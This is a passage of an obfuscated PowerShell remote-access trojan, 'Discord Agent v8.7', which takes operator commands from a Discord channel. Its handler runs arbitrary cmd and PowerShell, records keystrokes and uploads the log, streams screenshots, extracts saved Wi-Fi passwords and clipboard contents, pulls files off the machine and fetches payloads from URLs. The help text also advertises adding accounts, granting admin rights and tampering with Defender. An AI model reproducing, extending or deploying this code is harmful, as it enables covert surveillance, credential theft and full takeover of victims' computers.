**INPUT:** ``!sendkey <text>`` | ``!keys <text>``
**KLOG:** ``!keylog`` (start) | ``!keystop`` (stop + upload) | ``!keystat`` | ``!keylog clear``
**SYS:** ``!sysinfo`` ``!cpu`` ``!ram`` ``!disk`` ``!gpu`` ``!processes`` ``!services`` ``!whoami_all``
**NET:** ``!ipconfig`` ``!netstat`` ``!wifipass`` ``!pubip`` ``!ping_net`` ``!tracert`` ``!port``
**USER:** ``!netuser`` ``!netuser_add`` ``!netuser_passwd`` ``!promote_admin`` ``!netlocalgroup``
**PWR:** ``!lock`` ``!sleep`` ``!shutdown_sys`` ``!restart_sys`` ``!volume`` ``!msg <t>`` ``!speak <t>``
**REG/TASK:** ``!regread`` ``!regwrite`` ``!tasks`` ``!task_run``
**SEC:** ``!defender`` ``!av`` ``!takeown`` ``!icacls`` ``!sfc`` ``!chkdsk`` ``!bcdedit``
**WMIC:** ``!wmic_bios`` ``!wmic_cpu`` ``!wmic_disk`` ``!wmic_os`` ``!wmic_gpu`` ``!wmic_ram``
**EXEC:** ``!<cmd>`` | ``!cmd <cmd>`` | ``!ps <ps>``
'@

function Handle-Command {
    param($Message)
    try {
        if ($script:allowedUsers.Count -gt 0 -and $Message.author.id -notin $script:allowedUsers) { return }

        $xtCfmk    = [string]$Message.content
        $aUq5fvGH = $Message.author.username
        $msgId  = $Message.id
        $z46dHft = $xtCfmk.Trim()
        $EFjZVu = ($Message.attachments -and $Message.attachments.Count -gt 0)

        $Z2FMyb = Get-MessageTarget -Content $z46dHft
        if ($Z2FMyb.Target -eq 'other') { return }
        $OjCj = ([string]$Z2FMyb.Cmd).Trim()
        if (-not $OjCj -and -not $EFjZVu) { return }
        $qNnvR = ""
        if ($OjCj -match '^(\S+)') { $qNnvR = $Matches[1].ToLower() }
        $EmBahW = $null
        if ($OjCj -match '^[!/]') { $EmBahW = ($OjCj -replace '^[!/]', '').Trim() }
        elseif ($script:shellMode -and (Test-IsShellTarget) -and $OjCj) {
            if ($qNnvR -in $script:botOnlyCommands) { $EmBahW = $OjCj }
            else {
                $JI21cMBF = Get-Date -Format 'HH:mm:ss'
                [void]$script:history.Add("[$JI21cMBF] ${aUq5fvGH}: $OjCj")
                while ($script:history.Count -gt $script:historyMax) { $script:history.RemoveAt(0) }
                Resolve-ShellLine -Line $OjCj -MsgId $msgId
                return
            }
        } else {
            if ($OjCj -match '^(hi|hello|chao|hey)$') { Send-DiscordMessage -Content "hi $aUq5fvGH" -ReplyToId $msgId; return }
            if ($EFjZVu -and $Z2FMyb.Target -eq 'me') {
                $Xtpbfge = Download-DiscordAttachment -Message $Message
                if ($Xtpbfge.Count -gt 0) { Send-DiscordMessage -Content "saved: " + (($Xtpbfge | ForEach-Object { "``$_``" }) -join ", ") -ReplyToId $msgId }
            }
            return
        }
        if (-not $EmBahW -and -not $EFjZVu) { return }
        if ($EmBahW -match '^(\S+)\s*([\s\S]*)$') { $name = $Matches[1].ToLower(); $tNJR = $Matches[2] }
        else { $name = $EmBahW.ToLower(); $tNJR = "" }
        $JI21cMBF = Get-Date -Format 'HH:mm:ss'
        [void]$script:history.Add("[$JI21cMBF] ${aUq5fvGH}: $EmBahW")
        while ($script:history.Count -gt $script:historyMax) { $script:history.RemoveAt(0) }

        switch ($name) {
            "help"  { Send-DiscordMessage -Content $UBfIXKm -ReplyToId $msgId; return }
            "ping"  { Send-DiscordMessage -Content "pong" -ReplyToId $msgId; return }
            "id"    { Send-DiscordMessage -Content "ID: ``$($script:machineId)```nName: ``$($script:pcName)```nHost: ``$($script:hostname)```nInstance: #$($script:instanceId) ($(if($script:isActive){'ACTIVE'}else{'BACKUP'}))`nPID: $($script:myPid)" -ReplyToId $msgId; return }
            "instance" { Send-DiscordMessage -Content "Instance #$($script:instanceId) | **$(if($script:isActive){'ACTIVE'}else{'BACKUP'})** | PID $($script:myPid)`nMutex: ``$($script:mutexName)``" -ReplyToId $msgId; return }
            "instances" { Send-DiscordMessage -Content "Instance #$($script:instanceId) | $(if($script:isActive){'ACTIVE'}else{'BACKUP'})" -ReplyToId $msgId; return }
            "getpc" { Send-DiscordMessage -Content "PC: **$($script:pcName)** ``$($script:machineId)```nHost: ``$($script:hostname)```nSet: $(if($script:isSet){'yes'}else{'no'})" -ReplyToId $msgId; return }
            "setpc" {
                if (-not $tNJR) { Send-DiscordMessage -Content "usage: !setpc <name>" -ReplyToId $msgId; return }
                $DpOtxiEJ = ($tNJR.Trim() -split '\s+')[0]
                $script:pcName = $DpOtxiEJ; $script:isSet = $true
                $script:tag = "[$($script:pcName):$($script:machineId)]"
                Save-Config @{ name = $DpOtxiEJ; id = $script:machineId; host = $script:hostname }
                Send-DiscordMessage -Content "Ten: **$DpOtxiEJ**" -ReplyToId $msgId; return
            }
            "whoami"{ Send-DiscordMessage -Content "``$env:USERDOMAIN\$env:USERNAME`` admin=$(if(Test-Admin){'Y'}else{'N'})" -ReplyToId $msgId; return }
            "bot_info" {
                $Mcud2Fwx = (Get-Date) - $script:startTime
                $hFUm  = "**$($script:pcName)** ``$($script:machineId)`` #$($script:instanceId) | v8.7`n"
                $hFUm += "up $([math]::Floor($Mcud2Fwx.TotalHours))h$($Mcud2Fwx.Minutes)m | admin: $(if(Test-Admin){'Y'}else{'N'})`n"
                $hFUm += "Status: **$(if($script:isActive){'ACTIVE'}else{'BACKUP'})** | PID $($script:myPid)`n"
                $hFUm += "cwd ``$($script:workDir)``"
                Send-DiscordMessage -Content $hFUm -ReplyToId $msgId; return
            }
            "uptime" { $Mcud2Fwx=(Get-Date)-$script:startTime; Send-DiscordMessage -Content "up $([math]::Floor($Mcud2Fwx.TotalHours))h$($Mcud2Fwx.Minutes)m" -ReplyToId $msgId; return }
            "shutdown" { Send-DiscordMessage -Content "bot off" -ReplyToId $msgId; Start-Sleep 1; $script:running = $false; return }
            "history" { if ($script:history.Count -eq 0) { Send-DiscordMessage -Content "empty" -ReplyToId $msgId; return }; Send-CodeBlock -Title "history" -Body (($script:history | Select-Object -Last 20) -join "`n") -ReplyToId $msgId; return }
            "clearhist" { $script:history.Clear(); Send-DiscordMessage -Content "cleared" -ReplyToId $msgId; return }
            "cwd" { Send-DiscordMessage -Content "``$($script:workDir)``" -ReplyToId $msgId; return }
            "cd" {
                if (-not $tNJR) { Send-DiscordMessage -Content "``$($script:workDir)``" -ReplyToId $msgId; return }
                try {
                    $vAMDhry1 = $tNJR.Trim().Trim('"')
                    if ($vAMDhry1 -eq "..") { $DpOtxiEJ = (Get-Item -LiteralPath $script:workDir).Parent.FullName }
                    elseif ($vAMDhry1 -match '^[A-Za-z]:$') { $DpOtxiEJ = "$vAMDhry1\" }
                    elseif ([System.IO.Path]::IsPathRooted($vAMDhry1)) { $DpOtxiEJ = [System.IO.Path]::GetFullPath($vAMDhry1) }
                    else { $DpOtxiEJ = [System.IO.Path]::GetFullPath((Join-Path $script:workDir $vAMDhry1)) }
                    if (Test-Path -LiteralPath $DpOtxiEJ -PathType Container) { $script:workDir = (Get-Item -LiteralPath $DpOtxiEJ).FullName; Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $msgId }
                    else { Send-DiscordMessage -Content "not found" -ReplyToId $msgId }
                } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $msgId }
                return
            }
            "shell" {
                $Qo7e = $tNJR.Trim().ToLower()
                if ($Qo7e -eq "on") { $script:shellMode = $true; Send-DiscordMessage -Content "shell ON" -ReplyToId $msgId }
                elseif ($Qo7e -eq "off") { $script:shellMode = $false; Send-DiscordMessage -Content "shell OFF" -ReplyToId $msgId }
                else { Send-DiscordMessage -Content "shell: $(if($script:shellMode){'ON'}else{'OFF'})" -ReplyToId $msgId }
                return
            }
            "shellon" {
                $script:shellTargets.Clear()
                if (-not $tNJR) { [void]$script:shellTargets.Add('all') }
                else { foreach ($vAMDhry1 in ($tNJR.Trim() -split '\s+')) { if ($vAMDhry1) { [void]$script:shellTargets.Add($vAMDhry1) } } }
                if (Test-IsShellTarget) { $script:shellMode = $true; Send-DiscordMessage -Content "**$($script:pcName)** shell ON | targets: ``$($script:shellTargets -join ', ')``" -ReplyToId $msgId }
                else { $script:shellMode = $false }
                return
            }
            "shelloff" {
                $QRUlOOh = $true
                if ($tNJR) {
                    $QRUlOOh = $false
                    foreach ($vAMDhry1 in ($tNJR.Trim() -split '\s+')) {
                        $nBifFBfW = $vAMDhry1.ToLower()
                        if ($nBifFBfW -eq 'all' -or $nBifFBfW -eq '*' -or $nBifFBfW -eq $script:pcName.ToLower() -or $nBifFBfW -eq $script:hostname.ToLower()) { $QRUlOOh = $true; break }
                    }
                }
                if ($QRUlOOh) {
                    $script:shellMode = $false; $script:shellTargets.Clear()
                    Send-DiscordMessage -Content "**$($script:pcName)** shell OFF" -ReplyToId $msgId
                }
                return
            }
            "shells" { if ($script:shellMode) { Send-DiscordMessage -Content "**$($script:pcName)** in shell | ``$($script:shellTargets -join ', ')``" -ReplyToId $msgId }; return }
            "silent" { $Qo7e = $tNJR.Trim().ToLower(); if ($Qo7e -eq "off") { $script:silent = $false; Send-DiscordMessage -Content "loud" -ReplyToId $msgId } else { $script:silent = $true; Send-DiscordMessage -Content "silent" -ReplyToId $msgId }; return }
            "beat" { Send-Heartbeat; Send-DiscordMessage -Content "beat" -ReplyToId $msgId; return }

            "screenshot" { $path = Join-Path $env:TEMP "s_$(Get-Date -Format 'HHmmss').png"; if (Take-Screenshot -Path $path) { Send-DiscordFile -FilePath $path -Content "screenshot" -ReplyToId $msgId; Remove-Item $path -Force -EA SilentlyContinue } else { Send-DiscordMessage -Content "screenshot fail" -ReplyToId $msgId }; return }

            "capture" {
                $GuDcp = ""
                if ($tNJR) { $GuDcp = ($tNJR.Trim() -split '\s+')[0].ToLower() }

                if ($GuDcp -eq "stop" -or $GuDcp -eq "off") {
                    Send-DiscordMessage -Content (Stop-CaptureStream) -ReplyToId $msgId
                    return
                }
                if ($GuDcp -eq "status") {
                    $IJXS = $null
                    if ($script:capturePid) { $IJXS = Get-Process -Id $script:capturePid -EA SilentlyContinue }
                    if (-not $IJXS -and (Test-Path -LiteralPath $script:capturePidFile)) {
                        try { $beVwKCmL = [int](Get-Content -LiteralPath $script:capturePidFile -Raw); $IJXS = Get-Process -Id $beVwKCmL -EA SilentlyContinue } catch { }
                    }
                    if ($IJXS) {
                        $okUx1l = if ($script:captureStart) { [int]((Get-Date) - $script:captureStart).TotalSeconds } else { "?" }
                        Send-DiscordMessage -Content "Running | PID $($IJXS.Id) | ${okUx1l}s elapsed" -ReplyToId $msgId
                    } else {
                        Send-DiscordMessage -Content "Not running" -ReplyToId $msgId
                    }
                    return
                }
                if ($GuDcp -eq "err" -or $GuDcp -eq "log") {
                    if (-not (Test-Path -LiteralPath $script:captureErrFile)) {
                        Send-DiscordMessage -Content "No err log" -ReplyToId $msgId
                        return
                    }
                    $tYdaJug = Get-Content -LiteralPath $script:captureErrFile -Tail 50 -Encoding UTF8
                    Send-CodeBlock -Title "capture err log" -Body ($tYdaJug -join "`n") -ReplyToId $msgId
                    return
                }
                if ($GuDcp -eq "list") {
                    Add-Type -AssemblyName System.Windows.Forms
                    $n6fo9 = [System.Windows.Forms.Screen]::AllScreens
                    $QdyYbI = @("**0** = ALL (virtual screen)")
                    for ($hFUm = 0; $hFUm -lt $n6fo9.Count; $hFUm++) {
                        $Qo7e = $n6fo9[$hFUm]
                        $iCh5 = if ($Qo7e.Primary) { " [PRIMARY]" } else { "" }
                        $QdyYbI += "**$($hFUm+1)** : $($Qo7e.Bounds.Width)x$($Qo7e.Bounds.Height) @ ($($Qo7e.Bounds.X),$($Qo7e.Bounds.Y))$iCh5"
                    }
                    Send-CodeBlock -Title "Monitors" -Body ($QdyYbI -join "`n") -ReplyToId $msgId
                    return
                }
                $dwTscdd = if ($tNJR) { $tNJR.Trim() -split '\s+' } else { @() }
                $fps = 1; $jbItolN = 60; $SXZnW7MG = 0; $RWjv = 0
                try { if ($dwTscdd.Count -ge 1 -and $dwTscdd[0]) { $fps = [int]$dwTscdd[0] } } catch { }
                try { if ($dwTscdd.Count -ge 2 -and $dwTscdd[1]) { $jbItolN   = [int]$dwTscdd[1] } } catch { }
                try { if ($dwTscdd.Count -ge 3 -and $dwTscdd[2]) { $SXZnW7MG = [int]$dwTscdd[2] } } catch { }
                try { if ($dwTscdd.Count -ge 4 -and $dwTscdd[3]) { $RWjv = [int]$dwTscdd[3] } } catch { }
                if ($fps -lt 1) { $fps = 1 }; if ($fps -gt 2) { $fps = 2 }
                if ($jbItolN -lt 20) { $jbItolN = 20 }; if ($jbItolN -gt 90) { $jbItolN = 90 }
                if ($SXZnW7MG -lt 0) { $SXZnW7MG = 0 }
                if ($SXZnW7MG -gt 0 -and $SXZnW7MG -lt 5) { $SXZnW7MG = 5 }
                $DUTw = Start-CaptureStream -Fps $fps -Quality $jbItolN -MaxSeconds $SXZnW7MG -Monitor $RWjv
                Send-DiscordMessage -Content "$DUTw`n``!capture stop`` | ``!capture status`` | ``!capture err`` | ``!capture list``" -ReplyToId $msgId
                return
            }

            "sendkey" {
                if (-not $tNJR) { Send-DiscordMessage -Content "usage: !sendkey <text>" -ReplyToId $msgId; return }
                $CZLkx = $tNJR
                $ghXb = $CZLkx -replace "'", "''"
                $EmBahW = "`$w = New-Object -ComObject WScript.Shell; `$w.SendKeys('$ghXb')"
                Invoke-PSCommand -Command $EmBahW | Out-Null
                Send-DiscordMessage -Content "Sent: ``$CZLkx``" -ReplyToId $msgId
                return
            }

            "keylog" {
                $GuDcp = ""
                if ($tNJR) { $GuDcp = ($tNJR.Trim() -split '\s+')[0].ToLower() }
                if ($GuDcp -eq "clear") {
                    Remove-Item -LiteralPath $script:keylogLogFile -Force -EA SilentlyContinue
                    Send-DiscordMessage -Content "Log cleared" -ReplyToId $msgId
                    return
                }
                $DUTw = Start-KeyLog
                Send-DiscordMessage -Content "$DUTw`nDung: ``!keystop`` | Check: ``!keystat``" -ReplyToId $msgId
                return
            }

            "keystop" {
                if (-not $script:keylogPid -and -not (Test-Path -LiteralPath $script:keylogPidFile)) {
                    Send-DiscordMessage -Content "Keylog not running" -ReplyToId $msgId
                    return
                }
                $fSOU = Stop-KeyLog
                Send-DiscordMessage -Content $fSOU -ReplyToId $msgId
                if (Test-Path -LiteralPath $script:keylogLogFile) {
                    $YfED = (Get-Item $script:keylogLogFile).Length
                    if ($YfED -gt 0) {
                        if ($YfED -gt ($script:maxUploadMB * 1MB)) {
                            $tYdaJug = Get-Content $script:keylogLogFile -Tail 2000 -Encoding UTF8
                            Send-CodeBlock -Title "keylog (tail)" -Body ($tYdaJug -join "`n") -ReplyToId $msgId
                        } else {
                            Send-DiscordFile -FilePath $script:keylogLogFile -Content "keylog ($YfED bytes)" -ReplyToId $msgId
                        }
                    } else {
                        Send-DiscordMessage -Content "Log empty" -ReplyToId $msgId
                    }
                } else {
                    Send-DiscordMessage -Content "Log file not found" -ReplyToId $msgId
                }
                return
            }

            "keystat" {
                $IJXS = $null
                if ($script:keylogPid) { $IJXS = Get-Process -Id $script:keylogPid -EA SilentlyContinue }
                if (-not $IJXS -and (Test-Path -LiteralPath $script:keylogPidFile)) {
                    try { $beVwKCmL = [int](Get-Content -LiteralPath $script:keylogPidFile -Raw); $IJXS = Get-Process -Id $beVwKCmL -EA SilentlyContinue } catch { }
                }
                if ($IJXS) {
                    $okUx1l = if ($script:keylogStart) { [int]((Get-Date) - $script:keylogStart).TotalSeconds } else { "?" }
                    $YfED = if (Test-Path $script:keylogLogFile) { (Get-Item $script:keylogLogFile).Length } else { 0 }
                    Send-DiscordMessage -Content "Running | PID $($IJXS.Id) | ${okUx1l}s | log $YfED bytes" -ReplyToId $msgId
                } else {
                    $YfED = if (Test-Path $script:keylogLogFile) { (Get-Item $script:keylogLogFile).Length } else { 0 }
                    Send-DiscordMessage -Content "Not running | log $YfED bytes" -ReplyToId $msgId
                }
                return
            }

            "upload" { if (-not $tNJR) { return }; $IJXS = $tNJR.Trim().Trim('"'); if (-not [System.IO.Path]::IsPathRooted($IJXS)) { $IJXS = Join-Path $script:workDir $IJXS }; Send-DiscordFile -FilePath $IJXS -Content "upload" -ReplyToId $msgId; return }
            "send" { if (-not $tNJR) { return }; $IJXS = $tNJR.Trim().Trim('"'); if (-not [System.IO.Path]::IsPathRooted($IJXS)) { $IJXS = Join-Path $script:workDir $IJXS }; Send-DiscordFile -FilePath $IJXS -Content "send" -ReplyToId $msgId; return }
            "getfile" { if (-not $tNJR) { return }; $IJXS = $tNJR.Trim().Trim('"'); if (-not [System.IO.Path]::IsPathRooted($IJXS)) { $IJXS = Join-Path $script:workDir $IJXS }; Send-DiscordFile -FilePath $IJXS -Content "getfile" -ReplyToId $msgId; return }
            "download" {
                if (-not $tNJR) { return }
                $dwTscdd = $tNJR.Trim() -split '\s+', 2
                $qvfoC2s = $dwTscdd[0]
                try { $CheyiHQ = [uri]$qvfoC2s } catch { Send-DiscordMessage -Content "invalid URL" -ReplyToId $msgId; return }
                $ezduHe = if ($dwTscdd.Count -gt 1) { $dwTscdd[1].Trim().Trim('"') } else { $DpOtxiEJ = [System.IO.Path]::GetFileName($CheyiHQ.LocalPath); if (-not $DpOtxiEJ) { $DpOtxiEJ = "dl_$(Get-Date -Format 'HHmmss')" }; $DpOtxiEJ }
                if (-not [System.IO.Path]::IsPathRooted($ezduHe)) { $ezduHe = Join-Path $script:workDir $ezduHe }
                try { Invoke-WebRequest -Uri $qvfoC2s -OutFile $ezduHe -UseBasicParsing; Send-DiscordMessage -Content "``$ezduHe``" -ReplyToId $msgId } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $msgId }
                return
            }
            "dl" {
                if (-not $tNJR) { return }
                $qvfoC2s = ($tNJR.Trim() -split '\s+')[0]
                try { $CheyiHQ = [uri]$qvfoC2s } catch { Send-DiscordMessage -Content "invalid URL" -ReplyToId $msgId; return }
                $DpOtxiEJ = [System.IO.Path]::GetFileName($CheyiHQ.LocalPath); if (-not $DpOtxiEJ) { $DpOtxiEJ = "dl_$(Get-Date -Format 'HHmmss')" }
                $ezduHe = Join-Path $script:workDir $DpOtxiEJ
                try { Invoke-WebRequest -Uri $qvfoC2s -OutFile $ezduHe -UseBasicParsing; Send-DiscordMessage -Content "``$ezduHe``" -ReplyToId $msgId } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $msgId }
                return
            }
            "cmd"    { if (-not $tNJR) { return }; $DUTw = Invoke-CmdCommand -Command $tNJR; Send-CodeBlock -Title "cmd" -Body $DUTw -ReplyToId $msgId; return }
            "ps_cmd" { if (-not $tNJR) { return }; $DUTw = Invoke-PSCommand -Command $tNJR; Send-CodeBlock -Title "ps" -Body $DUTw -ReplyToId $msgId; return }
            "run"    { if (-not $tNJR) { return }; $DUTw = Invoke-CmdCommand -Command $tNJR; Send-CodeBlock -Title "run" -Body $DUTw -ReplyToId $msgId; return }
            "ps"     { $DUTw = Invoke-PSCommand -Command 'Get-Process|Sort-Object CPU -Descending|Select-Object -First 30 Name,Id,CPU,WS|Format-Table -AutoSize'; Send-CodeBlock -Title "proc" -Body $DUTw -ReplyToId $msgId; return }
            "sysinfo"{ $DUTw = Invoke-PSCommand -Command 'Get-CimInstance Win32_OperatingSystem|Select-Object Caption,Version,LastBootUpTime|Format-List'; Send-CodeBlock -Title "sysinfo" -Body $DUTw -ReplyToId $msgId; return }
            "cpu"    { $DUTw = Invoke-PSCommand -Command 'Get-CimInstance Win32_Processor|Format-List Name,NumberOfCores,NumberOfLogicalProcessors'; Send-CodeBlock -Title "cpu" -Body $DUTw -ReplyToId $msgId; return }
            "ram"    { $DUTw = Invoke-PSCommand -Command '$o=Get-CimInstance Win32_OperatingSystem;"Total: {0:N2} GB / Free: {1:N2} GB" -f ($o.TotalVisibleMemorySize/1MB),($o.FreePhysicalMemory/1MB)'; Send-CodeBlock -Title "ram" -Body $DUTw -ReplyToId $msgId; return }
            "disk"   { $DUTw = Invoke-PSCommand -Command 'Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"|ForEach-Object{"{0}: {1:N1} GB free / {2:N1} GB" -f $_.DeviceID,($_.FreeSpace/1GB),($_.Size/1GB)}'; Send-CodeBlock -Title "disk" -Body $DUTw -ReplyToId $msgId; return }
            "ipconfig" { $DUTw = Invoke-CmdCommand -Command "ipconfig /all"; Send-CodeBlock -Title "ipconfig" -Body $DUTw -ReplyToId $msgId; return }
            "netstat"  { $DUTw = Invoke-CmdCommand -Command "netstat -ano"; Send-CodeBlock -Title "netstat" -Body $DUTw -ReplyToId $msgId; return }
            "wifipass" { $DUTw = Get-WifiPasswords; Send-CodeBlock -Title "wifi pass" -Body $DUTw -ReplyToId $msgId; return }
            "admin"  { Send-DiscordMessage -Content "admin: $(if(Test-Admin){'yes'}else{'no'})" -ReplyToId $msgId; return }
            "keys"   { if (-not $tNJR) { return }; $BE3q = $tNJR -replace "'","''"; Invoke-PSCommand -Command "`$w=New-Object -ComObject WScript.Shell;`$w.SendKeys('$BE3q')" | Out-Null; Send-DiscordMessage -Content "keys sent" -ReplyToId $msgId; return }
            "clipboard_get" { $DUTw = Invoke-PSCommand -Command "Get-Clipboard"; Send-CodeBlock -Title "clip" -Body $DUTw -ReplyToId $msgId; return }
            "clipboard_set" { if (-not $tNJR) { return }; Invoke-PSCommand -Command "Set-Clipboard '$tNJR'" | Out-Null; Send-DiscordMessage -Content "ok" -ReplyToId $msgId; return }
            "lock"   { Invoke-CmdCommand -Command "rundll32.exe user32.dll,LockWorkStation" | Out-Null; Send-DiscordMessage -Content "locked" -ReplyToId $msgId; return }
            "shutdown_sys" { Invoke-CmdCommand -Command "shutdown /s /t 5" | Out-Null; Send-DiscordMessage -Content "off 5s" -ReplyToId $msgId; return }
            "restart_sys"  { Invoke-CmdCommand -Command "shutdown /r /t 5" | Out-Null; Send-DiscordMessage -Content "restart 5s" -ReplyToId $msgId; return }
            "msg"    { if (-not $tNJR) { return }; Invoke-PSCommand -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('$tNJR','Msg')" | Out-Null; Send-DiscordMessage -Content "msg" -ReplyToId $msgId; return }
            "speak"  { if (-not $tNJR) { return }; Invoke-PSCommand -Command "Add-Type -AssemblyName System.Speech;`$s=New-Object System.Speech.Synthesis.SpeechSynthesizer;`$s.Speak('$tNJR')" | Out-Null; Send-DiscordMessage -Content "speak" -ReplyToId $msgId; return }
            "beep"   { Invoke-PSCommand -Command '[console]::beep(1000,500)' | Out-Null; Send-DiscordMessage -Content "beep" -ReplyToId $msgId; return }

            default {
                if (-not $EmBahW -and $EFjZVu) {
                    $Xtpbfge = Download-DiscordAttachment -Message $Message
                    if ($Xtpbfge.Count -gt 0) { Send-DiscordMessage -Content "saved: " + (($Xtpbfge | ForEach-Object { "``$_``" }) -join ", ") -ReplyToId $msgId }
                    return
                }
                $uNbIUhs = Test-Dangerous -Command $EmBahW
                if ($uNbIUhs) { Send-DiscordMessage -Content "REFUSED: $uNbIUhs" -ReplyToId $msgId; return }
                $DUTw = Invoke-CmdCommand -Command $EmBahW
                Send-CodeBlock -Title "$($script:pcName)> $EmBahW" -Body $DUTw -ReplyToId $msgId
                return
            }
        }
    } catch {
        Log "[ERR] $($_.Exception.Message)" "Red"
        try { Send-DiscordMessage -Content "err: $($_.Exception.Message)" -ReplyToId $Message.id } catch {}
    }
}

# ==================== MAIN ====================
LogA "============================================" "Cyan"
LogA " DISCORD AGENT v8.7" "Cyan"
LogA "============================================" "Cyan"
LogA " Name:     $($script:pcName)" "White"
LogA " ID:       $($script:machineId)" "White"
LogA " Host:     $($script:hostname)" "White"
LogA " Instance: #$($script:instanceId)" "White"
LogA " PID:      $($script:myPid)" "White"
LogA " Mutex:    $($script:mutexName)" "White"
LogA "============================================" "Cyan"

if (-not $script:mutex) { LogA "Khong tao duoc mutex - thoat." "Red"; exit 1 }

$script:isActive = Try-Acquire
if (-not $script:isActive) {
    LogA ""
    LogA "BACKUP MODE" "Yellow"
    while ($script:running -and -not $script:isActive) {
        Start-Sleep -Seconds $script:backupTick
        if (Try-Acquire) { $script:isActive = $true; LogA "LOCK ACQUIRED" "Green"; break }
    }
    if (-not $script:isActive) { Release-Lock; exit 0 }
}

LogA "ACTIVE MODE" "Green"

try {
    $lZB5H = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers $xhD6grE -Method Get
    LogA "Bot: $($lZB5H.username)" "Green"
} catch { LogA "API fail: $_" "Red"; Release-Lock; exit 1 }

try {
    $ockM5D = Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$($script:channelId)/messages?limit=1" -Headers $xhD6grE
    if ($ockM5D) {
        $e6Ie = if ($ockM5D -is [array]) { $ockM5D[0] } else { $ockM5D }
        if ($e6Ie -and $e6Ie.id) { $script:lastMessageId = [string]$e6Ie.id }
    }
} catch { }

Send-Heartbeat

try {
    while ($script:running) {
        try {
            if (-not $script:isActive) { break }
            $l42BCaQ = New-Object System.Collections.ArrayList
            $O4fgXV = $script:lastMessageId
            $miON = [string]::IsNullOrEmpty($O4fgXV)
            do {
                if ($miON) { $qvfoC2s = "https://discord.com/api/v10/channels/$($script:channelId)/messages?limit=1" }
                else { $qvfoC2s = "https://discord.com/api/v10/channels/$($script:channelId)/messages?limit=50&after=$O4fgXV" }
                $qjHgin = Invoke-RestMethod -Uri $qvfoC2s -Headers $xhD6grE -Method Get
                if (-not $qjHgin) { break }
                if ($qjHgin -isnot [array]) { $qjHgin = @($qjHgin) }
                $qjHgin = @($qjHgin | Sort-Object { [long]$_.id })
                foreach ($vLUcR in $qjHgin) { [void]$l42BCaQ.Add($vLUcR); $O4fgXV = $vLUcR.id }
                if ($miON) { break }
            } while ($qjHgin.Count -eq 50)

            if ($miON) {
                if ($l42BCaQ.Count -gt 0) { $script:lastMessageId = [string]$l42BCaQ[$l42BCaQ.Count - 1].id }
            } else {
                foreach ($vLUcR in $l42BCaQ) {
                    if (-not $script:lastMessageId -or [long]$vLUcR.id -gt [long]$script:lastMessageId) { $script:lastMessageId = $vLUcR.id }
                    if ($vLUcR.author.id -eq $script:botUserId) { continue }
                    Handle-Command -Message $vLUcR
                }
            }
            if (((Get-Date) - $script:lastBeat).TotalSeconds -ge $script:heartbeatSec) { Send-Heartbeat }
        } catch { Log "[POLL] $($_.Exception.Message)" "Red"; Start-Sleep -Seconds 3 }
        Start-Sleep -Seconds $script:pollInterval
    }
} finally {
    if ($script:capturePid) { try { Stop-CaptureStream | Out-Null } catch { } }
    if ($script:keylogPid) { try { Stop-KeyLog | Out-Null } catch { } }
    Release-Lock
    LogA "Agent ket thuc." "Cyan"
}
